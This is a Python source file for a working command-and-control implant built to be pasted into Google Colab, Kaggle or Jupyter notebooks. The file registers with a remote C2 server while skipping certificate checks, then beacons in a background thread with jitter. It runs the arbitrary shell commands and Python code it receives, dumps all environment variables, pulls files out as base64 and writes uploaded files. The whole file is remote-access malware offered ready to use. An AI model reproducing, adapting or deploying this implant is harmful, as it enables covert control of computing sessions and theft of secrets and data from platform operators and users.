#!/usr/bin/env python3
"""C2 Agent — Google Colab / Kaggle / Jupyter.
Paste into a code cell and run. Connects in background via daemon thread."""

import os, sys, json, time, socket, platform, subprocess, uuid, threading, base64, ssl
from urllib.request import Request, urlopen, HTTPSHandler, build_opener
from base64 import b64encode, b64decode

C2_URL   = os.environ.get("C2_URL",   "http://CHANGE_ME:443")
AGENT_ID = os.environ.get("AGENT_ID", str(uuid.uuid4()))
SLEEP    = int(os.environ.get("SLEEP", "5"))

def http_post(path, data):
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    opener = build_opener(HTTPSHandler(context=ctx))
    req = Request(f"{C2_URL}{path}", data=json.dumps(data).encode(),
                  headers={"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"})
    return json.loads(opener.open(req, timeout=15).read())

def get_gpu_info():
    try:
        out = subprocess.check_output("nvidia-smi --query-gpu=name,memory.total --format=csv,noheader 2>/dev/null", shell=True, timeout=5).decode().strip()
        if out:
            return out
    except Exception:
        pass
    try:
        import tensorflow as tf
        tpus = tf.config.list_logical_devices("TPU")
        if tpus:
            return f"TPU x{len(tpus)}"
    except Exception:
        pass
    try:
        import torch
        if torch.cuda.is_available():
            return f"CUDA: {torch.cuda.get_device_name(0)}"
    except Exception:
        pass
    return "No GPU/TPU"

def detect_env():
    if os.environ.get("COLAB_GPU") or os.path.exists("/content"):
        return "colab"
    if os.environ.get("KAGGLE_URL_BASE") or os.path.exists("/kaggle"):
        return "kaggle"
    return "jupyter"

def register():
    gpu = get_gpu_info()
    env = detect_env()
    info = {
        "id": AGENT_ID,
        "hostname": f"{env}-{socket.gethostname()}",
        "username": subprocess.check_output("whoami", shell=True, timeout=5).decode().strip(),
        "os": f"{env.capitalize()} / {platform.system()} {platform.release()}",
        "arch": f"{platform.machine()} | GPU: {gpu}",
        "ip_internal": socket.gethostbyname(socket.gethostname()),
        "platform_type": env,
    }
    return http_post("/api/agent/register", info)

def execute_task(task):
    tt = task.get("task_type", "cmd")
    payload = task.get("payload", "")
    try:
        if tt == "cmd":
            return subprocess.check_output(payload, shell=True, stderr=subprocess.STDOUT, timeout=300).decode(errors="replace")

        elif tt == "python":
            import io
            buf = io.StringIO()
            old = sys.stdout; sys.stdout = buf
            try:
                exec(compile(payload, "<c2>", "exec"), {"__builtins__": __builtins__})
                return buf.getvalue() or "executed (no output)"
            finally:
                sys.stdout = old

        elif tt == "sysinfo":
            gpu = get_gpu_info()
            info = {
                "hostname": socket.gethostname(),
                "platform": platform.platform(),
                "cpu_count": os.cpu_count(),
                "python": platform.python_version(),
                "gpu": gpu,
                "env": detect_env(),
                "cwd": os.getcwd(),
                "env_vars": list(os.environ.keys()),
            }
            try:
                with open("/proc/meminfo") as f:
                    for line in f:
                        if line.startswith("MemTotal"):
                            info["mem_total_mb"] = int(line.split()[1]) // 1024
                            break
            except Exception:
                pass
            return json.dumps(info, indent=2)

        elif tt == "env":
            return "\n".join(f"{k}={v}" for k, v in sorted(os.environ.items()))

        elif tt == "ls":
            target = payload.strip() or "."
            return "\n".join(
                ("d " if os.path.isdir(os.path.join(target, x)) else "- ") + x
                for x in sorted(os.listdir(target))
            )

        elif tt == "download":
            if os.path.exists(payload):
                with open(payload, "rb") as f:
                    return f"[b64:{payload}] " + b64encode(f.read()).decode()
            return f"File not found: {payload}"

        elif tt == "upload":
            parts = payload.split("|", 1)
            if len(parts) == 2:
                path, b64data = parts
                os.makedirs(os.path.dirname(os.path.abspath(path)), exist_ok=True)
                with open(path, "wb") as f:
                    f.write(base64.b64decode(b64data))
                return f"Written to {path}"

        elif tt == "kill":
            http_post("/api/agent/result", {"task_id": task["id"], "result": "Colab agent terminated"})
            os._exit(0)

        else:
            return subprocess.check_output(payload, shell=True, stderr=subprocess.STDOUT, timeout=300).decode(errors="replace")

    except Exception as e:
        return f"[error] {type(e).__name__}: {e}"

def beacon_loop():
    import random
    _sleep = SLEEP
    _jitter = 10
    while True:
        try:
            resp = http_post("/api/agent/beacon", {"id": AGENT_ID})
            _sleep = int(resp.get("sleep", _sleep))
            _jitter = int(resp.get("jitter", _jitter))
            for task in resp.get("tasks", []):
                result = execute_task(task)
                if len(result) > 65000:
                    result = result[:65000] + "\n[...truncated]"
                http_post("/api/agent/result", {"task_id": task["id"], "result": result})
        except Exception:
            pass
        jitter_s = _sleep * _jitter / 100
        time.sleep(max(1, _sleep + random.uniform(-jitter_s, jitter_s)))

register()
threading.Thread(target=beacon_loop, daemon=True).start()
print(f"[C2] Connected as {AGENT_ID} | GPU: {get_gpu_info()}")
